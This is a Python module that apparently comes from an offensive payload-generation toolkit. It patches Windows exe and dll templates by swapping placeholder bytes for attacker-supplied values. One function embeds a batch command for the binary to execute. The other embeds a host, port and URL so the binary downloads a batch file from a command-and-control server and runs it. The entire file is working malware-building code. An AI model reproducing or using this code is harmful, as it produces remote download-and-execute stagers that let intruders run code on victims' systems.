import os, sys
from base64 import b64encode
from jinja2 import Template
import logging
from typing import List
import argparse
import struct 

from model import *
from helpers import *
from make.powershell.powershell import *


@DataTracker
def makePeExecCmd(bat: str, asDll: bool) -> AceBytes:
    """Returns an exe/dll which will execute input as bat"""
    if asDll:
        template = 'payloads/execc2cmd.dll'
    else:
        template = 'payloads/execc2cmd.exe'
    placeholderLen = 800
    if len(bat) > placeholderLen:
        raise Exception("  Input larger than {} bytes, template too small".format(placeholderLen))

    placeholder = b" " * placeholderLen
    exchange = bat + " " * (placeholderLen - len(bat))

    file = open(template, 'rb')
    data = file.read()
    file.close()

    data = replacer(data, placeholder, exchange)
    return AceBytes(data)


@DataTracker
def makePeExecCmdC2(host: str, port: str, url: str, asDll: bool) -> AceBytes:
    """Returns an exe/dll which will download & exec bat from host:port/url"""
    if asDll:
        template = 'payloads/execc2cmd.dll'
    else:
        template = 'payloads/execc2cmd.exe'
    placeholderLen = 55

    if len(host) > placeholderLen or len(url) > placeholderLen:
        raise Exception("  Input larger than {} bytes, template too small".format(placeholderLen))
    
    # char host[]  = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"; // len: 55
    pHost = b"B" * placeholderLen
    eHost = host + "\x00" * (placeholderLen - len(host))
    eHost = bytes(eHost, 'ascii')

    # char url[]   = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // len: 55
    pUrl = b"A" * placeholderLen
    eUrl = url + "\x00" * (placeholderLen - len(url))
    eUrl = bytes(eUrl, 'ascii')

    # char port[]  = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"; // len: 55
    pPort = b"C" * placeholderLen
    ePort = struct.pack('<I', int(port))
    ePort += b"\x00" * (placeholderLen - len(ePort))

    file = open(template, 'rb')
    data = file.read()
    file.close()

    data = replacer(data, pHost, eHost)
    data = replacer(data, pUrl, eUrl)
    data = replacer(data, pPort, ePort)
    return AceBytes(data)

